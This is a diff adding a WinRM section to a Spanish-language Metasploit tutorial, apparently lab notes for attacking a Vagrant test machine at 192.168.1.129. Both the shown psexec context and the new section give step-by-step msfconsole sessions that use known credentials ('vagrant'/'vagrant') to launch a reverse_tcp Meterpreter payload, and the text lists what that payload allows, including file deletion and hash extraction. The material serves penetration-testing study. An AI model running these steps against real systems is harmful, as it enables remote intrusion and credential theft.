@@ -30,3 +30,26 @@ msf exploit(psexec) > exploit
 El proceso es el siguiente: Abrimos la terminal de metasploit, y seleccionamos `exploit/windows/smb/psexec` mediante el comando `use`. Posteriormente le decimos al programa a qué IP queremos mandar el ataque, en nuestro caso a la `192.168.1.129`. Posteriormente se le indica el usuario y la contraseña que queremos utilizar para el ataque (Administrator y vagrant), y por últmo ejecutamos el exploit mediante el comando igualmente llamado `exploit`.
 
 Por defecto, la payload (el código malicioso que se ejecuta en el dispositivo al que queremos acceder) se tratará de Meterpreter, un programa muy potente que permite gran control sobre el sistema operativo, que nos permitirá explorar, modificar, borrar archivos, extraer usuarios y contraseñas hash, etc.
+
+### WinRM
+WinRM es un protocolo de Microsoft que permite acceder o intercambiar información de gestión de servidores y software a través de una red que viene preinstalado en los sistemas operativos Windows más modernos.
+
+En Windows Server 2008 existe una vulnerabilidad en la que, si conocemos las credenciales de un usuario o las crackeamos, podemos manipular la máquina de forma remota con utilidades como Meterpreter. Si el servicio de WinRM se encuentra activo, podemos hacer uso de `exploits/windows/winrm/winrm_script_exec` para aprovecharnos.
+
+Los pasos para realizar el script son los siguientes:
+
+```
+msf exploit(handler) > use exploit/windows/winrm/winrm_script_exec
+payload => windows/meterpreter/reverse_tcp
+msf exploit(winrm_script_exec) > set RHOST 192.168.1.129
+RHOST => 192.168.1.129
+msf exploit(winrm_script_exec) > set USERNAME vagrant
+USERNAME => vagrant
+msf exploit(winrm_script_exec) > set PASSWORD vagrant
+PASSWORD => vagrant
+msf exploit(winrm_script_exec) > exploit
+```
+
+El proceso es el siguiente:  Abrimos la terminal de metasploit, y seleccionamos `exploit/windows/winrm/winrm_script_exec` mediante el comando `use`. Posteriormente seleccionamos a qué IP queremos dirigir el ataque, en este caso a la `192.168.1.129`. Luego seleccionamos el usuario y contraseña con la cual haremos posible el exploit, en este caso `vagrant` y 'vagrant'. Por último, ejecutaremos `exploit` para proceder.
+
+Al igual que antes, meterpreter será la payload por defecto. Si queremos cambiarla, podemos hacer uso del comando `show payloads` para ver todos los payloads disponibles, y luego el comando `use payload [PAYLOAD A USAR]` para seleccionarlo.
